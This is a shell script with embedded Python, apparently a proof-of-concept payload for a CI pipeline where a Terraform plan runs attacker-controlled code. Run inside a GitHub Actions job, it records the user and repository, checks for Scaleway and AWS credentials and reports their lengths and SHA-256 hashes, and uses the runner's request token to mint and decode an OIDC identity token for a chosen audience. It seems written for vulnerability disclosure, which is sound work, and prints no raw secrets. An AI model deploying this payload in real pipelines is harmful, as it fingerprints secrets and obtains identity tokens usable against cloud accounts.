#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import base64
import hashlib
import json
import os
import urllib.request

def env_present(name):
    return "true" if bool(os.environ.get(name)) else "false"

def env_len(name):
    value = os.environ.get(name)
    return str(len(value)) if value else "0"

def env_sha256(name):
    value = os.environ.get(name)
    if not value:
        return "missing"
    return hashlib.sha256(value.encode()).hexdigest()

result = {
    "command_execution": "true",
    "proof": "terraform_plan_executed_attacker_controlled_program",
    "whoami": os.popen("whoami 2>/dev/null").read().strip() or "unknown",
    "github_event": os.environ.get("GITHUB_EVENT_NAME", "local"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "local"),
    "github_ref": os.environ.get("GITHUB_REF", "local"),

    # Presence/length/hash only. No secret values are printed.
    "scw_access_key_present": env_present("SCW_ACCESS_KEY"),
    "scw_secret_key_present": env_present("SCW_SECRET_KEY"),
    "aws_access_key_id_present": env_present("AWS_ACCESS_KEY_ID"),
    "aws_secret_access_key_present": env_present("AWS_SECRET_ACCESS_KEY"),

    "scw_access_key_length": env_len("SCW_ACCESS_KEY"),
    "scw_secret_key_length": env_len("SCW_SECRET_KEY"),
    "scw_access_key_sha256": env_sha256("SCW_ACCESS_KEY"),
    "scw_secret_key_sha256": env_sha256("SCW_SECRET_KEY"),

    "oidc_request_url_present": env_present("ACTIONS_ID_TOKEN_REQUEST_URL"),
    "oidc_request_token_present": env_present("ACTIONS_ID_TOKEN_REQUEST_TOKEN"),
    "oidc_token_obtained": "false",
    "oidc_audience": "not_requested",
    "oidc_repository_claim": "not_requested",
    "oidc_event_claim": "not_requested",
}

url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")

if url and token:
    try:
        request_url = url + "&audience=gip-inclusion-iac-poc"
        req = urllib.request.Request(
            request_url,
            headers={"Authorization": f"Bearer {token}"}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            body = json.loads(response.read().decode())
            jwt = body.get("value", "")
            parts = jwt.split(".")
            if len(parts) >= 2:
                payload = parts[1] + "=" * (-len(parts[1]) % 4)
                claims = json.loads(base64.urlsafe_b64decode(payload.encode()))
                result["oidc_token_obtained"] = "true"
                result["oidc_audience"] = str(claims.get("aud", "missing"))
                result["oidc_repository_claim"] = str(claims.get("repository", "missing"))
                result["oidc_event_claim"] = str(claims.get("event_name", "missing"))
    except Exception as e:
        result["oidc_error_type"] = type(e).__name__

print(json.dumps(result))
PY
